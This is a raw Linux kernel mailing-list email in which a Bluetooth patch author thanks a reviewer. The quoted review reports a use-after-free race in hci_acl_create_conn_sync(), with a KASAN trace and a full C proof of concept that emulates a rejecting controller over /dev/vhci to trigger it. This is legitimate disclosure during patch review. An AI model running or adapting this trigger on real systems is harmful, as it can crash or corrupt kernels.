Received: from fout-b4-smtp.messagingengine.com (fout-b4-smtp.messagingengine.com [202.12.124.147])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 86DE83F0762
	for <linux-bluetooth@vger.kernel.org>; Mon, 15 Jun 2026 12:38:45 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=202.12.124.147
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781527127; cv=none; b=NqHcOZOSOVMgGB+W6tBtvNaNUHgbm9UFl/vBdQSsIF4kK+tSM/9WAm3StvX19mgNKDsvrgWM6VXYQzJdspzLDqh2a3Trzirs6agaMwzJ1xEdrNk0nzSXvBeqVvAeNUG3f3IR9PsiernDlg5Q1lt0V5kDdUFakulSRB6hff7MQDs=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781527127; c=relaxed/simple;
	bh=jhx5r+V55hOk1HgUDVSXeWqwkyoMh4AY/jHli0jpUt4=;
	h=MIME-Version:Date:From:To:Cc:Message-Id:In-Reply-To:References:
	 Subject:Content-Type; b=j9Pjh3i3FWYno5LE2acUq1u0ZmuOuqBopRsBF/mzdhXz56uSHdJaY8KOpqLVds89R91kiXfZ/Vc/cFxyM/1TgblF1wknsbzLiJJ2fjdR/XQ9KXxBVr1heTHxjrYA45brHml+hfxeK6EzJQDq1bHQsXZyjAKPyBlXw7JbRMmUa64=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=fourdim.xyz; spf=pass smtp.mailfrom=fourdim.xyz; dkim=pass (2048-bit key) header.d=fourdim.xyz header.i=@fourdim.xyz header.b=Q41uYlgW; dkim=pass (2048-bit key) header.d=messagingengine.com header.i=@messagingengine.com header.b=bvrvNya0; arc=none smtp.client-ip=202.12.124.147
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=fourdim.xyz
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=fourdim.xyz
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=fourdim.xyz header.i=@fourdim.xyz header.b="Q41uYlgW";
	dkim=pass (2048-bit key) header.d=messagingengine.com header.i=@messagingengine.com header.b="bvrvNya0"
Received: from phl-compute-03.internal (phl-compute-03.internal [10.202.2.43])
	by mailfout.stl.internal (Postfix) with ESMTP id B896E1D000CD;
	Mon, 15 Jun 2026 08:38:44 -0400 (EDT)
Received: from phl-imap-10 ([10.202.2.85])
  by phl-compute-03.internal (MEProxy); Mon, 15 Jun 2026 08:38:44 -0400
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=fourdim.xyz; h=
	cc:cc:content-transfer-encoding:content-type:content-type:date
	:date:from:from:in-reply-to:in-reply-to:message-id:mime-version
	:references:reply-to:subject:subject:to:to; s=fm3; t=1781527124;
	 x=1781613524; bh=Q/Qzz9LLEF1Y7l9pA/ZUcAxeUda/4K38gW3HfxjqupE=; b=
	Q41uYlgWc9nbbZnGnpvQSUGjQ2Cy6Bqrs1N/yRqE7GdNwHHk30qlvxOzs3OvhEPP
	JFGUALhKR5gSbpUneF/Tge1w79gHQY8rm40T3yZPrBG4ig2sPE9+df1gkJoxnDIK
	WS9YXX8fADsWUSHK3CyOpxIXvhsZbJT3f9LDxK3Ft/xtxTKLO1l8Te/OlfFdVStW
	zA5kt58H4HNm1OvTOdFg6GwJ0Ag3dENuRb8xq4bk4lpjPKQ2v1XuC4cdUiPKZ0Ve
	h3DIcsBMCgy30VkGfwzTTD61V1wM0024yDQVviV40cI5syz2Nuj4R9CG58i9bgj1
	rK2kfWDnmFD1AIumN8GoEw==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	messagingengine.com; h=cc:cc:content-transfer-encoding
	:content-type:content-type:date:date:feedback-id:feedback-id
	:from:from:in-reply-to:in-reply-to:message-id:mime-version
	:references:reply-to:subject:subject:to:to:x-me-proxy
	:x-me-sender:x-me-sender:x-sasl-enc; s=fm1; t=1781527124; x=
	1781613524; bh=Q/Qzz9LLEF1Y7l9pA/ZUcAxeUda/4K38gW3HfxjqupE=; b=b
	vrvNya0JwmrCnfifd/H9+xTqFqWju8M3WIDu3CB5u51jxHJunFL6w04MYRj6LIuy
	EfzBwLlbksh3nYPEadNpxmzQrQmAyd/d4uD/sKHQ2Z6T2AgM0s4/dOT8LM5pbxrB
	Ey05CFxantbEkuB8+yHzK6THbtj6MiKxJm1CE0NGs0mnPWzIMMnWMWo6DJeGABzy
	CCR6k8ZSmYC9hXVyq5/ToVLdl7L2wkAl8ya8RiTAalW04gmbSH53MZOa/kLbEnSz
	1tG7gQM5C24ygF/C9FgJLczylSvyJ+0nRlKnqyAyKWCqmfKQq/M0SYG7GcfgPApO
	AjUeGVfpRcTUrekZUetRw==
X-ME-Sender: <xms:VPIvarL1I3ufF8ZRm8hEmtVPNnEpu3FzSZlzumOAJ2AZH8AEVe7urQ>
    <xme:VPIvap9ctHQHU4v4ndtWs-Ln1aelB3-zhyRfFVbnqq1J6pjAyNvbOWR6-UDPsYFgm
    H-oI95velbjakm4EAeFFoNHQvTX7CtE8pe1OnmJ0AnT5zw_Cx4xfQ>
X-ME-Proxy-Cause: dmFkZTFbzlEdjTcqktu2oY3msssfOTV7jr/4VmcCEkj5aoysIjvA1iZJCz/9vr+EHdRT5M
    rEkfNXCp0bdYt40YlNO2DMWmCjKdEDb0PN1m7m7o4qcdgaVEdK1BbSX0VOVahOH14OOJKk
    aUkgIB65QUB7ZuTIqhhzu47us6cu+0C+DTq0BaXPdvypndwtkrABcCDCA2viRINu/3tcGx
    sMAUDZRhH43yI4aPdO60/nVPK9+rYXAppp6Uy2sFfa2AZcxRqnWHYs6GYI2vYktIhbKcGZ
    cygfvvRqdfgtR6ibwd55zaUoeeIxfQIfviKuAZAcUcBRLCGskRlHEAY7tN71FiigisaOhT
    +YpdOzSRi5Ex1pOeJSGSEqvn9kwn1JmNcXHS511MXEYUjnUPn6agIPUaQ/OMNhUfvuHSvi
    oFintyYz/8H92OIVSpoijs/Nxw42DyD48JWc2QK01Y1Hf/yBFZCxqcWookJZcke9s3Ry3w
    zR9oszd+CQemMCRo81vOoRUK3NK+6mCD8n93bnBkCSGe+HHVcbcWbyYBwqGiRkVKDFnbfA
    8w9Hs6Wa4oT8wjXU2Kjfe17PR6VAX7+8iXrOeS/0FSmQRf80LURKAfQUn6qsDE1GOA3wNI
    X/ABHBOMfyyIk1nQ7pOvoP4VpR9QMfh7u7oWgIgRy2PUnkJ4xyZQD9djFYCw
X-ME-Proxy: <xmx:VPIvavnRxYjTrZWTOk9b5dqIIPcK3pBsaKzAtKSyj6-TN18pZPRQ9Q>
    <xmx:VPIvaqmgNl_S5QbJWYPMuB86EBAc_c7n7GuBsZwcS_oFL6gVtkvz9Q>
    <xmx:VPIvaou5x7LCDd06DCMdYqI9Y26AmaZZ2z0hmNeGlXsyKiz60zVG1Q>
    <xmx:VPIvalljcjAcsGM8M0vKBeBMNfk7uOh7RuOsWy5Jj2iUuL5IB5Z3Mw>
    <xmx:VPIvarvSFhpJ_ItQv9meWBL3oPjRyeAT8KREOgL4unKWqg22L3S7jxIV>
Feedback-ID: if72e4b10:Fastmail
Received: by mailuser.phl.internal (Postfix, from userid 501)
	id 50930216008A; Mon, 15 Jun 2026 08:38:44 -0400 (EDT)
X-Mailer: MessagingEngine.com Webmail Interface
Precedence: bulk
X-Mailing-List: linux-bluetooth@vger.kernel.org
List-Id: <linux-bluetooth.vger.kernel.org>
List-Subscribe: <mailto:linux-bluetooth+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-bluetooth+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
X-ThreadId: AyaPtLk80PWF
Date: Mon, 15 Jun 2026 08:38:24 -0400
From: "Siwei Zhang" <oss@fourdim.xyz>
To: "XIAO WU" <xiaowu.417@qq.com>,
 "Luiz Augusto von Dentz" <luiz.dentz@gmail.com>
Cc: linux-bluetooth@vger.kernel.org
Message-Id: <bed30255-ccf4-4f84-a19d-557bd8bdeeb0@app.fastmail.com>
In-Reply-To: <tencent_CB641244263894463F94A2B27D5E9BE43D07@qq.com>
References: <20260611152039.2176565-1-oss@fourdim.xyz>
 <tencent_CB641244263894463F94A2B27D5E9BE43D07@qq.com>
Subject: Re: [PATCH v3] Bluetooth: hci_conn: Fix null ptr deref in hci_abort_conn()
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

Hi Xiao Wu,

On Sat, Jun 13, 2026, at 6:40 AM, XIAO WU wrote:
> Hi Siwei,
>
> On Thu, 11 Jun 2026 11:19:52 -0400, Siwei Zhang wrote:
>  > Bluetooth: hci_conn: Fix null ptr deref in hci_abort_conn()
>
> This patch correctly fixes the NULL dereference in hci_abort_conn() by
> tracking in-flight create commands with HCI_CONN_CREATE.
>
> I noticed a Sashiko review[1] of this patch flagged that the new
> clear_bit(HCI_CONN_CREATE, &conn->flags) calls after
> __hci_cmd_sync_status_sk() introduce a use-after-free.=C2=A0 I wrote a=
 PoC
> to verify this and was able to trigger it reliably on a KASAN-enabled
> kernel.
>
> The race:
>
>  =C2=A0 If the controller rejects the ACL connection attempt (e.g. via
>  =C2=A0 Command Status with a non-zero status), the RX thread processe=
s the
>  =C2=A0 rejection in hci_cs_create_conn() =E2=86=92 hci_conn_del(), fr=
eeing the
>  =C2=A0 hci_conn object.=C2=A0 Shortly after, __hci_cmd_sync_status_sk=
() returns
>  =C2=A0 the error to hci_acl_create_conn_sync() on the hci_cmd_sync_wo=
rk
>  =C2=A0 worker, which then writes to the freed conn via clear_bit().
>
> My PoC opens /dev/vhci, creates a virtual controller that responds to
> HCI_OP_CREATE_CONN with Command Status error 0x2e, powers on the
> controller, and triggers an L2CAP connect.=C2=A0 This reliably hits:
>
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> BUG: KASAN: slab-use-after-free in hci_acl_create_conn_sync+0x3c6/0x600
> Write of size 8 at addr ffff88802eed2950 by task kworker/u11:0/57
> Workqueue: hci0 hci_cmd_sync_work
>
> Call Trace:
>  =C2=A0<TASK>
>  =C2=A0dump_stack_lvl+0x116/0x1f0
>  =C2=A0print_report+0xf4/0x600
>  =C2=A0kasan_report+0xe0/0x110
>  =C2=A0kasan_check_range+0x100/0x1b0
>  =C2=A0hci_acl_create_conn_sync+0x3c6/0x600=C2=A0 =C2=A0 <-- clear_bit=
 on freed conn
>  =C2=A0hci_cmd_sync_work+0x1b0/0x480
>  =C2=A0process_one_work+0xa20/0x1c50
>  =C2=A0worker_thread+0x6df/0xf30
>  =C2=A0kthread+0x387/0x4a0
>
> Allocated by task 9349 (L2CAP connect):
>  =C2=A0__hci_conn_add+0xfd/0x1df0
>  =C2=A0hci_conn_add_unset+0x7b/0x130
>  =C2=A0hci_connect_acl+0x4aa/0x7c0
>  =C2=A0l2cap_chan_connect+0x779/0x2160
>  =C2=A0l2cap_sock_connect+0x381/0x7a0
>
> Freed by task 9353 (RX thread):
>  =C2=A0kfree+0x171/0x720
>  =C2=A0device_release+0xd7/0x280
>  =C2=A0hci_conn_del_sysfs+0x17b/0x1a0
>  =C2=A0hci_conn_del+0x685/0x11d0
>  =C2=A0hci_cs_create_conn+0x1e9/0x430=C2=A0 =C2=A0 =C2=A0<-- controlle=
r rejection
>  =C2=A0hci_cmd_status_evt+0x267/0x790
>  =C2=A0hci_event_packet+0x521/0xce0
>  =C2=A0hci_rx_work+0x2ce/0x1030
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>
> The race window:
>
>  =C2=A0 hci_acl_create_conn_sync()=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0hci_rx_work()
>  =C2=A0 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D
>  =C2=A0 __hci_cmd_sync_status_sk(...)=C2=A0 =C2=A0 =C2=A0 =C2=A0 hci_c=
s_create_conn()
>  =C2=A0 =C2=A0 =E2=86=92 waiting for controller reply=C2=A0 =C2=A0 =C2=
=A0 =C2=A0=E2=86=92 hci_conn_del()
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0=E2=86=92 kfree(conn)
>  =C2=A0 clear_bit(HCI_CONN_CREATE,
>  =C2=A0 =C2=A0 &conn->flags);=C2=A0 =E2=86=90 UAF
>
> The same pattern exists in hci_le_create_conn_sync().
>
> One possible fix: take a reference on conn before the cmd_sync call
> and drop it after clear_bit(), or move the clear_bit to a point where
> the conn is still guaranteed to be alive.=C2=A0 The Sashiko review[1]
> points out a few other issues in the same patch as well.
>
> I wrote the following PoC.=C2=A0 It opens /dev/vhci, emulates a contro=
ller
> that rejects CREATE_CONN, powers up via MGMT, and triggers an L2CAP
> connect to exercise the race.
>
> ---8<--- poc.c ---
> /*
>  =C2=A0* PoC for UAF in hci_acl_create_conn_sync()
>  =C2=A0*
>  =C2=A0* Opens /dev/vhci, creates a virtual HCI controller that respon=
ds to
>  =C2=A0* HCI_OP_CREATE_CONN with Command Status 0x2e=20
> (HCI_ERROR_COMMAND_DISALLOWED).
>  =C2=A0* The RX thread processes this via hci_cs_create_conn() and fre=
es the=20
> conn,
>  =C2=A0* while the hci_cmd_sync_work worker then hits the UAF in clear=
_bit().
>  =C2=A0*
>  =C2=A0* Build:=C2=A0 gcc -Wall -O2 -o poc poc.c -lpthread
>  =C2=A0* Run:=C2=A0 =C2=A0 ./poc=C2=A0 =C2=A0(root, KASAN-enabled kern=
el, vhci loaded)
>  =C2=A0*/
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <fcntl.h>
> #include <errno.h>
> #include <sys/socket.h>
> #include <sys/poll.h>
> #include <pthread.h>
> #include <stdint.h>
>
> #define HCI_COMMAND_PKT 0x01
> #define HCI_EVENT_PKT=C2=A0 =C2=A0 0x04
> #define HCI_VENDOR_PKT=C2=A0 =C2=A00xff
> #define HCI_EV_CMD_COMPLETE 0x0e
> #define HCI_EV_CMD_STATUS=C2=A0 =C2=A00x0f
> #define HCI_OP_CREATE_CONN=C2=A0 0x0405
> #define HCI_OP_RESET=C2=A0 =C2=A0 =C2=A0 =C2=A0 0x0c03
> #define BTPROTO_L2CAP=C2=A0 =C2=A00
> #define BTPROTO_HCI=C2=A0 =C2=A0 =C2=A01
> #define BDADDR_BREDR=C2=A0 =C2=A0 0x00
> #define HCI_CHANNEL_CONTROL 3
>
> struct sockaddr_l2 {
>  =C2=A0 =C2=A0 uint16_t l2_family, l2_psm;
>  =C2=A0 =C2=A0 uint8_t=C2=A0 l2_bdaddr[6];
>  =C2=A0 =C2=A0 uint16_t l2_cid;
>  =C2=A0 =C2=A0 uint8_t=C2=A0 l2_bdaddr_type;
> } __attribute__((packed));
>
> struct sockaddr_hci {
>  =C2=A0 =C2=A0 uint16_t hci_family, hci_dev, hci_channel;
> };
>
> static volatile int vhci_fd =3D -1;
> static volatile int saw_conn =3D 0;
>
> static int send_evt(uint8_t e, const void *d, uint8_t dl)
> {
>  =C2=A0 =C2=A0 uint8_t b[512];
>  =C2=A0 =C2=A0 b[0] =3D HCI_EVENT_PKT; b[1] =3D e; b[2] =3D dl;
>  =C2=A0 =C2=A0 if (dl && d) memcpy(b + 3, d, dl);
>  =C2=A0 =C2=A0 return write(vhci_fd, b, 3 + dl);
> }
>
> static int read_cmd(uint16_t *o, uint8_t *p, int *pl, int tmo)
> {
>  =C2=A0 =C2=A0 uint8_t b[8192];
>  =C2=A0 =C2=A0 struct pollfd pf =3D {.fd =3D vhci_fd, .events =3D POLL=
IN};
>  =C2=A0 =C2=A0 int r =3D poll(&pf, 1, tmo);
>  =C2=A0 =C2=A0 if (r <=3D 0) return -1;
>  =C2=A0 =C2=A0 r =3D read(vhci_fd, b, sizeof(b));
>  =C2=A0 =C2=A0 if (r < 4 || b[0] !=3D HCI_COMMAND_PKT) return -1;
>  =C2=A0 =C2=A0 *o =3D b[1] | (b[2] << 8); *pl =3D b[3];
>  =C2=A0 =C2=A0 if (p && *pl) memcpy(p, b + 4, (*pl < r - 4) ? *pl : r =
- 4);
>  =C2=A0 =C2=A0 return 1;
> }
>
> static void send_ok(uint16_t o) { uint8_t r[1] =3D {0};=20
> send_evt(HCI_EV_CMD_COMPLETE, r, 1); }
> static void send_cc(uint16_t o, const void *rd, uint8_t rl) {=20
> send_evt(HCI_EV_CMD_COMPLETE, rd, rl); }
> static void send_cs(uint16_t o, uint8_t s) {
>  =C2=A0 =C2=A0 uint8_t p[4] =3D {s, 1, o & 0xff, (o >> 8) & 0xff};
>  =C2=A0 =C2=A0 send_evt(HCI_EV_CMD_STATUS, p, 4);
> }
>
> static void *init_thr(void *a)
> {
>  =C2=A0 =C2=A0 (void)a;
>  =C2=A0 =C2=A0 uint16_t o; uint8_t p[256]; int pl;
>  =C2=A0 =C2=A0 while (1) {
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 if (read_cmd(&o, p, &pl, 2000) < 0) { usl=
eep(50000); continue; }
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 if (o =3D=3D HCI_OP_CREATE_CONN) {
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 /* Reject with Command Stat=
us error 0x2e */
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 send_cs(o, 0x2e);
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 saw_conn =3D 1;
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 continue;
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 }
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 if (o =3D=3D HCI_OP_RESET) { send_ok(o); =
continue; }
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 /* ... handle many other HCI commands for=
 init ... */
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 send_ok(o);
>  =C2=A0 =C2=A0 }
>  =C2=A0 =C2=A0 return 0;
> }
>
> struct mgmt_hdr { uint16_t opcode, index, len; } __attribute__((packed=
));
> #define MGMT_OP_SET_POWERED=C2=A0 =C2=A0 =C2=A00x0005
> #define MGMT_OP_SET_CONNECTABLE 0x000b
>
> int main(void)
> {
>  =C2=A0 =C2=A0 printf("[*] open vhci\n");
>  =C2=A0 =C2=A0 vhci_fd =3D open("/dev/vhci", O_RDWR);
>  =C2=A0 =C2=A0 if (vhci_fd < 0) { perror("vhci"); return 1; }
>  =C2=A0 =C2=A0 uint8_t c[2] =3D {HCI_VENDOR_PKT, 0}; write(vhci_fd, c,=
 2);
>
>  =C2=A0 =C2=A0 printf("[*] start vhci init thread\n");
>  =C2=A0 =C2=A0 pthread_t t; pthread_create(&t, 0, init_thr, 0);
>  =C2=A0 =C2=A0 sleep(6);
>
>  =C2=A0 =C2=A0 /* Power on via MGMT */
>  =C2=A0 =C2=A0 int mgmt =3D socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI=
);
>  =C2=A0 =C2=A0 if (mgmt >=3D 0) {
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 struct sockaddr_hci ha =3D {AF_BLUETOOTH,=
 0xffff,=20
> HCI_CHANNEL_CONTROL};
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 if (bind(mgmt, (struct sockaddr *)&ha, si=
zeof(ha)) =3D=3D 0) {
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 uint8_t cmd[256];
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 struct mgmt_hdr *hdr =3D (s=
truct mgmt_hdr *)cmd;
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 hdr->opcode =3D MGMT_OP_SET=
_POWERED; hdr->index =3D 0; hdr->len=20
> =3D 1;
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 cmd[sizeof(*hdr)] =3D 1;
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 write(mgmt, cmd, sizeof(*hd=
r) + 1);
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 usleep(200000);
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 hdr->opcode =3D MGMT_OP_SET=
_CONNECTABLE;
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 write(mgmt, cmd, sizeof(*hd=
r) + 1);
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 usleep(200000);
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 }
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 close(mgmt);
>  =C2=A0 =C2=A0 }
>
>  =C2=A0 =C2=A0 /* L2CAP connect triggers hci_connect_acl =E2=86=92 hci=
_acl_create_conn_sync */
>  =C2=A0 =C2=A0 printf("[*] L2CAP connect (trigger)\n");
>  =C2=A0 =C2=A0 int l2 =3D socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO=
_L2CAP);
>  =C2=A0 =C2=A0 if (l2 >=3D 0) {
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 struct sockaddr_l2 ba; memset(&ba, 0, siz=
eof(ba));
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 ba.l2_family =3D AF_BLUETOOTH; ba.l2_bdad=
dr_type =3D BDADDR_BREDR;
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 bind(l2, (struct sockaddr *)&ba, sizeof(b=
a));
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 struct sockaddr_l2 ca; memset(&ca, 0, siz=
eof(ca));
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 ca.l2_family =3D AF_BLUETOOTH; ca.l2_psm =
=3D 1;
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 ca.l2_bdaddr_type =3D BDADDR_BREDR;
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 memset(ca.l2_bdaddr, 0x11, 6);
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 connect(l2, (struct sockaddr *)&ca, sizeo=
f(ca));
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 close(l2);
>  =C2=A0 =C2=A0 }
>  =C2=A0 =C2=A0 usleep(500000);
>  =C2=A0 =C2=A0 pthread_cancel(t); pthread_join(t, 0); close(vhci_fd);
>  =C2=A0 =C2=A0 printf("[*] done. Check dmesg for KASAN slab-use-after-=
free.\n");
>  =C2=A0 =C2=A0 return 0;
> }
> ---8<---
>
> Hope this helps with the patch.=C2=A0 Let me know if you need addition=
al
> information from the test setup.
>
> [1]=20
> https://sashiko.dev/#/patchset/20260611152039.2176565-1-oss%40fourdim.=
xyz

Thanks for your review. I will send a new patch to fix this.
I would like to add a suggested by if i have your permission.

Best,
Siwei
